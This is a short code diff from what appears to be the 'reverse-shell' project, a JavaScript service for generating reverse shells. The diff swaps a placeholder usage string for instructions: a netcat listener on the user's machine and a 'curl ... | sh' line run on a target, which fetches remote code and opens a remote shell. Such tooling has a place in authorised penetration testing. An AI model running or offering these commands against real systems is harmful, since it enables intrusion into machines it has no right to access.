@@ -1,8 +1,15 @@
 'use strict';
 
-const usage = `
-i was here
-`;
+const usage = `# Reverse Shell as a Service
+# https://github.com/lukechilds/reverse-shell
+#
+# 1. On your machine:
+#      nc -l 1337
+#
+# 2. On the target machine:
+#      curl https://reverse-shell.sh/yourip:1337 | sh
+#
+# 3. Don't be a dick`;
 
 const reverseShell = (address = '') => {
 	const [host, port] = address.split(':');
